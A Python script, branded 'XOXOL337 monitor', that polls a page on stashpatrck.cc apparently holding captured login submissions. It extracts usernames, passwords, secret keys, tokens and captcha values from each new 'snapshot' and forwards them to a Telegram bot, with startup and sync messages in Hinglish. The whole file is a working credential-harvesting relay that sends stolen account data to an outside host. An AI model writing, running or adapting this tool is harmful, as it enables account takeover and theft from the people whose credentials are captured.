#!/usr/bin/env python3
"""
XOXOL337 Website Monitor - Tracks ALL snapshots from stashpatrck.cc
Sends Telegram notification for each NEW snapshot detected
"""

import requests
import re
import json
import time
import os
import sys
from datetime import datetime

# ============== CONFIG ==============
URL = "https://stashpatrck.cc/error.php?sys_cmd=run_diagnostics&auth=7f8c9d2e1b3a4f56"
CHECK_INTERVAL = int(os.getenv("CHECK_INTERVAL", "60"))

TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN", "")
TELEGRAM_CHAT_ID = os.getenv("TELEGRAM_CHAT_ID", "")

STATE_FILE = "monitor_state.json"

# Unbuffered output for Render logs
sys.stdout.reconfigure(line_buffering=True) if hasattr(sys.stdout, 'reconfigure') else None


def log(msg):
    """Print with timestamp"""
    ts = datetime.now().strftime("%H:%M:%S")
    print(f"[{ts}] {msg}", flush=True)


def send_telegram_message(message):
    """Send message to Telegram"""
    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
        log("[!] Telegram not configured. Message:")
        log(message)
        return False

    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": TELEGRAM_CHAT_ID,
        "text": message,
        "parse_mode": "Markdown",
        "disable_web_page_preview": True
    }

    try:
        response = requests.post(url, json=payload, timeout=30)
        if response.status_code == 200:
            log("[+] Telegram notification sent!")
            return True
        else:
            log(f"[!] Telegram error {response.status_code}: {response.text}")
            # Try without markdown if parsing failed
            payload["parse_mode"] = ""
            response = requests.post(url, json=payload, timeout=30)
            return response.status_code == 200
    except Exception as e:
        log(f"[!] Failed to send Telegram: {e}")
        return False


def fetch_page():
    """Fetch the website HTML"""
    try:
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9",
            "Cache-Control": "no-cache",
            "Pragma": "no-cache",
        }
        response = requests.get(URL, headers=headers, timeout=30)
        response.raise_for_status()
        return response.text
    except Exception as e:
        log(f"[!] Fetch error: {e}")
        return None


def parse_snapshots(html):
    """
    Parse all snapshots from the page.
    Each snapshot starts with 'SNAPSHOT ID:' and contains multiple key:value pairs.
    """
    if not html:
        return []

    # Remove HTML tags for easier parsing (but keep line structure)
    text = re.sub(r'<br\s*/?>', '\n', html, flags=re.IGNORECASE)
    text = re.sub(r'</(p|div|tr|li|h\d)>', '\n', text, flags=re.IGNORECASE)
    text = re.sub(r'<[^>]+>', '', text)
    text = re.sub(r'&nbsp;', ' ', text)
    text = re.sub(r'&amp;', '&', text)
    text = re.sub(r'&lt;', '<', text)
    text = re.sub(r'&gt;', '>', text)
    text = re.sub(r'&quot;', '"', text)

    # Split by "SNAPSHOT ID:"
    parts = re.split(r'SNAPSHOT\s+ID\s*[:=]\s*', text, flags=re.IGNORECASE)

    snapshots = []
    for part in parts[1:]:  # Skip first part (before any SNAPSHOT ID)
        # Get snapshot ID (first token until whitespace/newline)
        id_match = re.match(r'([a-fA-F0-9]+)', part.strip())
        if not id_match:
            continue

        snapshot_id = id_match.group(1)

        # Stop parsing this snapshot when next "SNAPSHOT ID" appears
        snapshot_body = part

        # Extract all key: value pairs
        fields = {}

        # Look for patterns like "key: value" or "key=value"
        # Captures: username, password, secreate_key, secret_key, _token, etc.
        field_patterns = [
            (r'username\s*[:=]\s*([^\n\r<]+?)(?=\n|\r|$|\s{2,})', 'username'),
            (r'password\s*[:=]\s*([^\n\r<]+?)(?=\n|\r|$|\s{2,})', 'password'),
            (r'secreate[_\-]?key\s*[:=]\s*([^\n\r<]+?)(?=\n|\r|$|\s{2,})', 'secreate_key'),
            (r'secret[_\-]?key\s*[:=]\s*([^\n\r<]+?)(?=\n|\r|$|\s{2,})', 'secret_key'),
            (r'_token\s*[:=]\s*([^\n\r<]+?)(?=\n|\r|$|\s{2,})', '_token'),
            (r'captcha\s*[:=]\s*([^\n\r<]+?)(?=\n|\r|$|\s{2,})', 'captcha'),
            (r'loginType\s*[:=]\s*([^\n\r<]+?)(?=\n|\r|$|\s{2,})', 'loginType'),
            (r'save_secret_key_user_id\s*[:=]\s*([^\n\r<]+?)(?=\n|\r|$|\s{2,})', 'save_secret_key_user_id'),
        ]

        for pattern, key in field_patterns:
            match = re.search(pattern, snapshot_body, re.IGNORECASE)
            if match:
                value = match.group(1).strip()
                if value:
                    fields[key] = value

        snapshot = {
            "id": snapshot_id,
            "fields": fields,
            "captured_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        }
        snapshots.append(snapshot)

    return snapshots


def load_seen_ids():
    """Load previously seen snapshot IDs"""
    if os.path.exists(STATE_FILE):
        try:
            with open(STATE_FILE, 'r') as f:
                data = json.load(f)
                return set(data.get("seen_ids", []))
        except Exception as e:
            log(f"[!] State load error: {e}")
            return set()
    return set()


def save_seen_ids(seen_ids, snapshots):
    """Save seen IDs to state file"""
    try:
        data = {
            "seen_ids": list(seen_ids),
            "last_updated": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "last_snapshots": snapshots[-10:]  # Keep last 10 for reference
        }
        with open(STATE_FILE, 'w') as f:
            json.dump(data, f, indent=2)
    except Exception as e:
        log(f"[!] State save error: {e}")


def format_snapshot_message(snapshot, is_new=True):
    """Format a snapshot for Telegram"""
    status = "NEW SNAPSHOT DETECTED" if is_new else "Initial Snapshot"

    msg_lines = [
        f"*{status}*",
        "",
        f"*Snapshot ID:* `{snapshot['id']}`",
        f"*Time:* {snapshot['captured_at']}",
        "",
    ]

    fields = snapshot['fields']

    # Priority fields first
    priority_order = ['username', 'password', 'secreate_key', 'secret_key',
                      '_token', 'captcha', 'loginType', 'save_secret_key_user_id']

    shown = set()
    for key in priority_order:
        if key in fields:
            value = fields[key]
            # Escape markdown special chars in value
            safe_value = value.replace('`', "'").replace('*', '\\*').replace('_', '\\_')
            msg_lines.append(f"*{key}:* `{value}`")
            shown.add(key)

    # Any other fields
    for key, value in fields.items():
        if key not in shown:
            msg_lines.append(f"*{key}:* `{value}`")

    if not fields:
        msg_lines.append("_No fields extracted (empty snapshot)_")

    msg_lines.append("")
    msg_lines.append("XOXOL337 MONITOR")

    return "\n".join(msg_lines)


def main():
    print("=" * 60, flush=True)
    print("XOXOL337 WEBSITE MONITOR - BLACK ORCHID ACTIVE", flush=True)
    print("=" * 60, flush=True)
    print(f"Target: {URL}", flush=True)
    print(f"Check interval: {CHECK_INTERVAL} seconds", flush=True)
    print(f"Telegram configured: {'YES' if TELEGRAM_BOT_TOKEN else 'NO'}", flush=True)
    print(f"Chat ID: {TELEGRAM_CHAT_ID}", flush=True)
    print("=" * 60, flush=True)

    # Send startup notification
    if TELEGRAM_BOT_TOKEN:
        startup_msg = (
            "*XOXOL337 MONITOR STARTED*\n\n"
            f"Target: `stashpatrck.cc`\n"
            f"Interval: every `{CHECK_INTERVAL}s`\n"
            f"Started: `{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}`\n\n"
            "Aapko har naye snapshot ka notification milega!"
        )
        send_telegram_message(startup_msg)

    seen_ids = load_seen_ids()
    log(f"[+] Loaded {len(seen_ids)} previously seen snapshot IDs")

    is_first_run = len(seen_ids) == 0

    while True:
        try:
            log("Checking website...")
            html = fetch_page()

            if not html:
                log("[!] No HTML fetched, retrying in 30s")
                time.sleep(30)
                continue

            snapshots = parse_snapshots(html)
            log(f"[+] Found {len(snapshots)} total snapshots on page")

            new_snapshots = [s for s in snapshots if s['id'] not in seen_ids]

            if is_first_run and len(new_snapshots) > 5:
                log(f"[!] First run: {len(new_snapshots)} existing snapshots - marking as seen (no spam)")
                summary_msg = (
                    "*INITIAL SYNC COMPLETE*\n\n"
                    f"Found `{len(snapshots)}` existing snapshots on the page.\n"
                    "All marked as seen.\n\n"
                    "*Ab sirf NEW snapshots ka notification aayega!*\n\n"
                    f"Check interval: every `{CHECK_INTERVAL}s`\n\n"
                    "XOXOL337 MONITOR"
                )
                send_telegram_message(summary_msg)

                for s in snapshots:
                    seen_ids.add(s['id'])
                save_seen_ids(seen_ids, snapshots)
                is_first_run = False
                log(f"[+] Marked {len(snapshots)} snapshots as seen")
            elif new_snapshots:
                log(f"[!!!] {len(new_snapshots)} NEW SNAPSHOTS detected!")
                for snapshot in new_snapshots:
                    sid = snapshot['id']
                    log(f"[NEW] {sid} - Fields: {list(snapshot['fields'].keys())}")

                    msg = format_snapshot_message(snapshot, is_new=True)
                    send_telegram_message(msg)

                    seen_ids.add(sid)
                    time.sleep(1)

                save_seen_ids(seen_ids, snapshots)
                log(f"[+] Sent {len(new_snapshots)} new notifications")
            else:
                log(f"[=] No new snapshots (tracking {len(seen_ids)} total)")

            is_first_run = False

        except KeyboardInterrupt:
            log("[!] Stopped by user")
            break
        except Exception as e:
            log(f"[!] Error in main loop: {e}")
            import traceback
            traceback.print_exc()

        log(f"Sleeping {CHECK_INTERVAL}s...")
        time.sleep(CHECK_INTERVAL)


if __name__ == "__main__":
    main()
